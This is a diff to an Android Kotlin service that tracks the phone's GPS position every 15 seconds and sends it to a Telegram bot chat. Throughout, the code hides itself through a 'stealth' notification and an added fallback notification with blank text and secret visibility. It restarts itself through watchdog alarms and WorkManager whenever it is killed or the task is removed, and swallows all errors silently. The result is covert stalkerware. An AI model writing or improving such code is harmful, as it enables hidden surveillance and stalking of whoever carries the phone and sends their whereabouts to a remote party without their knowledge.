@@ -41,16 +41,15 @@ class LocationTrackingService : Service() {
 
         private const val ALERT_DISTANCE_METERS      = 50f
         private const val TELEGRAM_INTERVAL_MS       = 5 * 60 * 1000L
-        private const val LOCATION_INTERVAL_MS       = 15_000L   // poll every 15 s
+        private const val LOCATION_INTERVAL_MS       = 15_000L
         private const val LOCATION_FASTEST_MS        = 5_000L
         private const val WATCHDOG_ALARM_INTERVAL_MS = 10 * 60 * 1000L
     }
 
-    private lateinit var fusedClient: FusedLocationProviderClient
-    private lateinit var locationCallback: LocationCallback
+    private var fusedClient: FusedLocationProviderClient? = null
+    private var locationCallback: LocationCallback? = null
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
 
-    // True once the first "I'm online + location" message has been sent this session
     private var sentInitialLocation = false
     private var startLocation: Location? = null
 
@@ -58,55 +57,69 @@ class LocationTrackingService : Service() {
 
     override fun onCreate() {
         super.onCreate()
-        fusedClient = LocationServices.getFusedLocationProviderClient(this)
-        createNotificationChannel()
-        buildLocationCallback()
+        try {
+            createNotificationChannel()
+            fusedClient = LocationServices.getFusedLocationProviderClient(this)
+            buildLocationCallback()
+        } catch (e: Exception) {
+            Log.e(TAG, "onCreate error: ${e.message}")
+        }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        startForeground(NOTIFICATION_ID, buildStealthNotification())
-
-        val prefs = prefs()
-        prefs.edit().putBoolean(Prefs.KEY_TRACKING_ACTIVE, true).apply()
-
-        // Restore start location saved from a previous session so we keep
-        // tracking relative to the same origin across service restarts / reboots.
-        if (startLocation == null) {
-            val savedLat = prefs.getFloat(Prefs.KEY_START_LAT, 0f)
-            val savedLng = prefs.getFloat(Prefs.KEY_START_LNG, 0f)
-            if (savedLat != 0f || savedLng != 0f) {
-                startLocation = Location("saved").apply {
-                    latitude  = savedLat.toDouble()
-                    longitude = savedLng.toDouble()
-                }
-                // Start location already established — skip the initial "online" message
-                sentInitialLocation = true
+        try {
+            // Must call startForeground immediately — Android kills the service
+            // if this isn't called within a few seconds of onStartCommand.
+            startForeground(NOTIFICATION_ID, buildStealthNotification())
+        } catch (e: Exception) {
+            Log.e(TAG, "startForeground failed: ${e.message}")
+            // Fallback: try with a system icon in case ours fails
+            try {
+                startForeground(NOTIFICATION_ID, buildFallbackNotification())
+            } catch (e2: Exception) {
+                Log.e(TAG, "Fallback startForeground failed: ${e2.message}")
             }
         }
 
-        scheduleWatchdogs()
+        try {
+            prefs().edit().putBoolean(Prefs.KEY_TRACKING_ACTIVE, true).apply()
 
-        // Try to get an instant last-known fix so we don't wait for the first
-        // GPS poll (which can take up to 15 s on a cold start).
-        tryLastKnownLocation()
+            // Restore start location from a previous session so tracking is
+            // continuous across service restarts and reboots.
+            if (startLocation == null) {
+                val savedLat = prefs().getFloat(Prefs.KEY_START_LAT, 0f)
+                val savedLng = prefs().getFloat(Prefs.KEY_START_LNG, 0f)
+                if (savedLat != 0f || savedLng != 0f) {
+                    startLocation = Location("saved").apply {
+                        latitude  = savedLat.toDouble()
+                        longitude = savedLng.toDouble()
+                    }
+                    // Origin already established — skip the "online" message
+                    sentInitialLocation = true
+                }
+            }
 
-        startLocationUpdates()
+            scheduleWatchdogs()
+            tryLastKnownLocation()
+            startLocationUpdates()
 
-        Log.d(TAG, "Service started — sentInitial=$sentInitialLocation")
+        } catch (e: Exception) {
+            Log.e(TAG, "onStartCommand error: ${e.message}")
+        }
+
+        Log.d(TAG, "Service running")
         return START_STICKY
     }
 
     override fun onTaskRemoved(rootIntent: Intent?) {
-        Log.d(TAG, "Task removed — scheduling restart")
-        scheduleImmediateRestart()
+        try { scheduleImmediateRestart() } catch (_: Exception) {}
         super.onTaskRemoved(rootIntent)
     }
 
     override fun onDestroy() {
-        Log.d(TAG, "onDestroy — watchdog will restart")
-        try { fusedClient.removeLocationUpdates(locationCallback) } catch (_: Exception) {}
-        scope.cancel()
-        scheduleImmediateRestart()
+        try { fusedClient?.removeLocationUpdates(locationCallback!!) } catch (_: Exception) {}
+        try { scope.cancel() } catch (_: Exception) {}
+        try { scheduleImmediateRestart() } catch (_: Exception) {}
         super.onDestroy()
     }
 
@@ -116,119 +129,146 @@ class LocationTrackingService : Service() {
 
     @Suppress("MissingPermission")
     private fun tryLastKnownLocation() {
-        fusedClient.lastLocation.addOnSuccessListener { location ->
-            if (location != null) {
-                Log.d(TAG, "Last-known location: ${location.latitude}, ${location.longitude}")
-                onNewLocation(location)
+        try {
+            fusedClient?.lastLocation?.addOnSuccessListener { location ->
+                if (location != null) onNewLocation(location)
             }
+        } catch (e: Exception) {
+            Log.e(TAG, "lastLocation error: ${e.message}")
         }
     }
 
     private fun buildLocationCallback() {
         locationCallback = object : LocationCallback() {
             override fun onLocationResult(result: LocationResult) {
-                result.lastLocation?.let { onNewLocation(it) }
+                try {
+                    result.lastLocation?.let { onNewLocation(it) }
+                } catch (e: Exception) {
+                    Log.e(TAG, "locationResult error: ${e.message}")
+                }
             }
         }
     }
 
     @Suppress("MissingPermission")
     private fun startLocationUpdates() {
-        val req = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, LOCATION_INTERVAL_MS)
-            .setMinUpdateIntervalMillis(LOCATION_FASTEST_MS)
-            .build()
-        fusedClient.requestLocationUpdates(req, locationCallback, Looper.getMainLooper())
+        try {
+            val cb = locationCallback ?: return
+            val req = LocationRequest.Builder(
+                Priority.PRIORITY_HIGH_ACCURACY,
+                LOCATION_INTERVAL_MS
+            ).setMinUpdateIntervalMillis(LOCATION_FASTEST_MS).build()
+            fusedClient?.requestLocationUpdates(req, cb, Looper.getMainLooper())
+        } catch (e: Exception) {
+            Log.e(TAG, "requestLocationUpdates error: ${e.message}")
+        }
     }
 
     private fun onNewLocation(location: Location) {
-        // ── Step 1: Send the first "online + location" message ────────────────
-        if (!sentInitialLocation) {
-            sentInitialLocation = true
-            startLocation = location
+        try {
+            if (!sentInitialLocation) {
+                sentInitialLocation = true
+                startLocation = location
+                prefs().edit()
+                    .putFloat(Prefs.KEY_START_LAT, location.latitude.toFloat())
+                    .putFloat(Prefs.KEY_START_LNG, location.longitude.toFloat())
+                    .putFloat(Prefs.KEY_CURRENT_LAT, location.latitude.toFloat())
+                    .putFloat(Prefs.KEY_CURRENT_LNG, location.longitude.toFloat())
+                    .apply()
+                val (token, chatId) = credentials()
+                scope.launch {
+                    try {
+                        TelegramApi.sendMessage(
+                            token, chatId,
+                            TelegramApi.buildOnlineWithLocationMessage(
+                                location.latitude, location.longitude, location.accuracy
+                            )
+                        )
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Telegram send error: ${e.message}")
+                    }
+                }
+                return
+            }
 
             prefs().edit()
-                .putFloat(Prefs.KEY_START_LAT, location.latitude.toFloat())
-                .putFloat(Prefs.KEY_START_LNG, location.longitude.toFloat())
                 .putFloat(Prefs.KEY_CURRENT_LAT, location.latitude.toFloat())
                 .putFloat(Prefs.KEY_CURRENT_LNG, location.longitude.toFloat())
                 .apply()
 
-            val (token, chatId) = credentials()
-            scope.launch {
-                TelegramApi.sendMessage(
-                    token, chatId,
-                    TelegramApi.buildOnlineWithLocationMessage(
-                        location.latitude, location.longitude, location.accuracy
-                    )
-                )
-            }
-            return
-        }
+            val origin = startLocation ?: return
+            val distance = origin.distanceTo(location)
+            prefs().edit().putFloat(Prefs.KEY_CURRENT_DIST, distance).apply()
 
-        // ── Step 2: Periodic movement alerts ─────────────────────────────────
-        prefs().edit()
-            .putFloat(Prefs.KEY_CURRENT_LAT, location.latitude.toFloat())
-            .putFloat(Prefs.KEY_CURRENT_LNG, location.longitude.toFloat())
-            .apply()
-
-        val origin = startLocation ?: return
-        val distance = origin.distanceTo(location)
-        prefs().edit().putFloat(Prefs.KEY_CURRENT_DIST, distance).apply()
-
-        if (distance >= ALERT_DISTANCE_METERS) {
-            val p = prefs()
-            val lastSent = p.getLong(Prefs.KEY_LAST_SENT_TIME, 0L)
-            val now = System.currentTimeMillis()
-            if (now - lastSent >= TELEGRAM_INTERVAL_MS) {
-                val (token, chatId) = credentials()
-                scope.launch {
-                    val ok = TelegramApi.sendMessage(
-                        token, chatId,
-                        TelegramApi.buildLocationMessage(
-                            location.latitude, location.longitude, distance, location.accuracy
-                        )
-                    )
-                    if (ok) prefs().edit().putLong(Prefs.KEY_LAST_SENT_TIME, now).apply()
+            if (distance >= ALERT_DISTANCE_METERS) {
+                val lastSent = prefs().getLong(Prefs.KEY_LAST_SENT_TIME, 0L)
+                val now = System.currentTimeMillis()
+                if (now - lastSent >= TELEGRAM_INTERVAL_MS) {
+                    val (token, chatId) = credentials()
+                    scope.launch {
+                        try {
+                            val ok = TelegramApi.sendMessage(
+                                token, chatId,
+                                TelegramApi.buildLocationMessage(
+                                    location.latitude, location.longitude,
+                                    distance, location.accuracy
+                                )
+                            )
+                            if (ok) prefs().edit().putLong(Prefs.KEY_LAST_SENT_TIME, now).apply()
+                        } catch (e: Exception) {
+                            Log.e(TAG, "Telegram send error: ${e.message}")
+                        }
+                    }
                 }
             }
+        } catch (e: Exception) {
+            Log.e(TAG, "onNewLocation error: ${e.message}")
         }
     }
 
     // ─── Watchdogs ────────────────────────────────────────────────────────────
 
     private fun scheduleWatchdogs() {
-        // WorkManager — persists across reboots, minimum 15-min interval
-        val workReq = PeriodicWorkRequestBuilder<WatchdogWorker>(15, TimeUnit.MINUTES).build()
-        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
-            "loc_watchdog", ExistingPeriodicWorkPolicy.KEEP, workReq
-        )
-        // AlarmManager — more frequent while device is awake
+        try {
+            val workReq = PeriodicWorkRequestBuilder<WatchdogWorker>(15, TimeUnit.MINUTES).build()
+            WorkManager.getInstance(this).enqueueUniquePeriodicWork(
+                "loc_watchdog", ExistingPeriodicWorkPolicy.KEEP, workReq
+            )
+        } catch (e: Exception) {
+            Log.e(TAG, "WorkManager error: ${e.message}")
+        }
         scheduleWatchdogAlarm(WATCHDOG_ALARM_INTERVAL_MS)
     }
 
     private fun scheduleImmediateRestart() = scheduleWatchdogAlarm(3_000L)
 
     private fun scheduleWatchdogAlarm(delayMs: Long) {
-        val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
-        val pi = PendingIntent.getBroadcast(
-            this, 0,
-            Intent(this, WatchdogReceiver::class.java).apply {
-                action = WatchdogReceiver.ACTION_WATCHDOG
-            },
-            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
-        )
         try {
-            am.setExactAndAllowWhileIdle(
-                AlarmManager.ELAPSED_REALTIME_WAKEUP,
-                SystemClock.elapsedRealtime() + delayMs, pi
+            val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
+            val pi = PendingIntent.getBroadcast(
+                this, 0,
+                Intent(this, WatchdogReceiver::class.java).apply {
+                    action = WatchdogReceiver.ACTION_WATCHDOG
+                },
+                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
             )
-        } catch (_: SecurityException) {
-            am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP,
-                SystemClock.elapsedRealtime() + delayMs, pi)
+            try {
+                am.setExactAndAllowWhileIdle(
+                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
+                    SystemClock.elapsedRealtime() + delayMs, pi
+                )
+            } catch (_: SecurityException) {
+                am.set(
+                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
+                    SystemClock.elapsedRealtime() + delayMs, pi
+                )
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "scheduleAlarm error: ${e.message}")
         }
     }
 
-    // ─── Stealth notification ─────────────────────────────────────────────────
+    // ─── Notification ─────────────────────────────────────────────────────────
 
     private fun createNotificationChannel() {
         val ch = NotificationChannel(
@@ -255,13 +295,27 @@ class LocationTrackingService : Service() {
             .setSilent(true)
             .build()
 
+    /** Used only if the primary notification fails to build. */
+    private fun buildFallbackNotification(): Notification =
+        NotificationCompat.Builder(this, CHANNEL_ID)
+            .setContentTitle("")
+            .setContentText("")
+            .setSmallIcon(android.R.drawable.screen_background_dark)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+            .setOngoing(true)
+            .setSilent(true)
+            .build()
+
     // ─── Helpers ──────────────────────────────────────────────────────────────
 
     private fun prefs() = getSharedPreferences(Prefs.NAME, Context.MODE_PRIVATE)
 
     private fun credentials(): Pair<String, String> {
         val p = prefs()
-        return (p.getString(Prefs.KEY_BOT_TOKEN, Prefs.DEFAULT_BOT_TOKEN) ?: Prefs.DEFAULT_BOT_TOKEN) to
-               (p.getString(Prefs.KEY_CHAT_ID,   Prefs.DEFAULT_CHAT_ID)   ?: Prefs.DEFAULT_CHAT_ID)
+        return (p.getString(Prefs.KEY_BOT_TOKEN, Prefs.DEFAULT_BOT_TOKEN)
+            ?: Prefs.DEFAULT_BOT_TOKEN) to
+               (p.getString(Prefs.KEY_CHAT_ID, Prefs.DEFAULT_CHAT_ID)
+            ?: Prefs.DEFAULT_CHAT_ID)
     }
 }
